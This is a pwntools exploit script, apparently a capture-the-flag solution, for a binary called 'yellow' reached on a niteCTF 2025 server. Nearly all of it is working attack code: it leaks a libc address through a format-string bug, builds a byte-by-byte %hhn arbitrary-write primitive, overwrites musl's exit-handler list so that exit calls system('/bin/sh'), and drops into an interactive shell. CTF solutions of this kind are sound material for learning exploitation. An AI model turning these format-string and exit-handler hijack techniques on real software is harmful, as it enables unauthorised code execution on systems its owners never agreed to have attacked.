from pwn import *

context.arch = 'amd64'
# p = process('./chall')
p = remote('yellow.chals.nitectf25.live', 1337, ssl=True)
exe = ELF('./yellow')
libc = exe.libc

def split_byte_to_3x99(n: int):
    assert 0 <= n <= 255
    a = max(0, min(99, n))
    n -= (a-1)
    b = max(0, min(99, n))
    n -= (b-1)
    c = max(0, n)
    return f"{a:02d}", f"{b:02d}", f"{c:02d}"

def write_primitive(addr, value):
    for i in range(8):
        if type(value) is str:
            byte = ord(value[i])
        else:
            byte = (value >> (i * 8)) & 0xff
        if byte < 11:
            byte += 256 # mod 256
        c1, c2, c3 = split_byte_to_3x99(byte - 10)
        payload = (f'%c%c%c%c%c%c%c%c%{c1}c%{c2}c%{c3}c%hhn').encode() + p64(addr + i) + b'\n'
        info(f'payload: {payload}')
        p.sendlineafter(b'>>', b'2') 
        p.sendlineafter(b'index:', b'0')
        p.sendlineafter(b'encounter', payload)
        info(f'Wrote byte: {(byte%256):02x} to {hex(addr + i)}')

def make_char(idx, char_class, name):
    p.sendlineafter(b'>>', b'1') 
    p.sendlineafter(b'index:', str(idx).encode())
    p.sendlineafter(b'class', str(char_class).encode()) 
    p.sendlineafter(b'name', name)

def action(idx, payload=None):
    p.sendlineafter(b'>>', b'2') 
    p.sendlineafter(b'index:', str(idx).encode())
    output = p.recvuntil(b'encounter', timeout=1)
    info(f'payload: {payload}, length: {len(payload) if payload else 0}')
    if b'encounter' in output and payload:
        p.send(payload) 

def trigger():
    p.sendlineafter(b'>>', b'3') 
    p.interactive()

info("Creating character to trigger off-by-one...")
make_char(0, 1, b'A' * 32)

info("Leaking Libc address...")
payload = ('%1$p.%p.%2$p\n').encode()
pause()
action(0, payload)
p.recvuntil(b'adventurers..\n')
leak_addresses = p.recvline().strip().split(b'.')
print(leak_addresses)
leaked_addr = int(leak_addresses[0].decode(), 16)
action_ret_addr = int(leak_addresses[2].decode(), 16) - 0xc
success(f"Leaked Address: {hex(leaked_addr)}")
libc.address = leaked_addr - (libc.symbols['__stdout_FILE']) + 0x100
handler_head_addr = libc.symbols['head']
handler_slot_addr = libc.symbols['slot']
success(f"Libc Base Address: {hex(libc.address)}")
success(f"Action Return Address: {hex(action_ret_addr)}")

# redirect exit handler to system placed in .data
"""
static struct fl
{
	struct fl *next;
	void (*f[COUNT])(void *);
	void *a[COUNT];
} builtin, *head;
"""
COUNT = 32
data_section = 0x404060
system_addr = libc.symbols['system']
info(f"system() Address: {hex(system_addr)}")

#ayload = (f'%c%c%c%c%c%c%c%00c%00c%00c%0c%p').encode() + p64(system_addr) + b'\n'
#action(0, payload) 
#p.recvuntil(b'adventurers..\n')
#print(p.recvline())

pause()
write_primitive(data_section + COUNT * 0x8, system_addr) # f[COUNT] = system
write_primitive(data_section + COUNT * 0x8 * 2, data_section)
write_primitive(data_section, "/bin/sh\x00") # a[COUNT] = &"/bin/sh"
write_primitive(handler_head_addr, data_section) # head = &data_section
write_primitive(libc.address + 0xbf000 + 0x1fa4, 32) 



pause()
trigger()
pause()




